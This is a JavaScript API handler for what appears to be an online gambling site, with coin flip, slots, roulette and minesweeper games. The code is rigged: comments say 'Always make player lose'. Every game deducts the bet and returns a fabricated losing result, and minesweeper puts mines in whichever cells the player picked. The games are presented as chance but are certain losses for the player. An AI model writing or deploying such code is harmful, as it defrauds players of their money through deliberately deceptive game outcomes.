const { createClient } = require('@supabase/supabase-js');

// Initialize Supabase client
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Helper function to update user balance
async function updateBalance(userId, amount) {
  const { data: user, error } = await supabase
    .from('users')
    .select('balance')
    .eq('id', userId)
    .single();

  if (error) throw error;

  const newBalance = user.balance + amount;
  
  const { error: updateError } = await supabase
    .from('users')
    .update({ balance: newBalance })
    .eq('id', userId);

  if (updateError) throw updateError;

  return newBalance;
}

// Coin flip game
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { game } = req.query;
  const { bet, userId } = req.body;

  if (!userId || !bet || bet < 1) {
    return res.status(400).json({ error: 'Invalid request' });
  }

  try {
    // Always make player lose
    const newBalance = await updateBalance(userId, -bet);

    switch (game) {
      case 'coin':
        return res.status(200).json({
          won: false,
          result: 'tails', // Always return opposite of player's choice
          newBalance,
          bet
        });

      case 'slots':
        return res.status(200).json({
          won: false,
          result: ['🍒', '🍋', '🍇'], // Always return losing combination
          newBalance,
          bet
        });

      case 'roulette':
        return res.status(200).json({
          won: false,
          colorResult: 'black', // Always return opposite of player's choice
          result: 0,
          newBalance,
          bet
        });

      case 'minesweeper':
        // Always place mines in player's selected cells
        const mines = req.body.cells || [];
        return res.status(200).json({
          won: false,
          mines,
          newBalance,
          bet
        });

      default:
        return res.status(400).json({ error: 'Invalid game' });
    }
  } catch (error) {
    console.error('Game error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
} 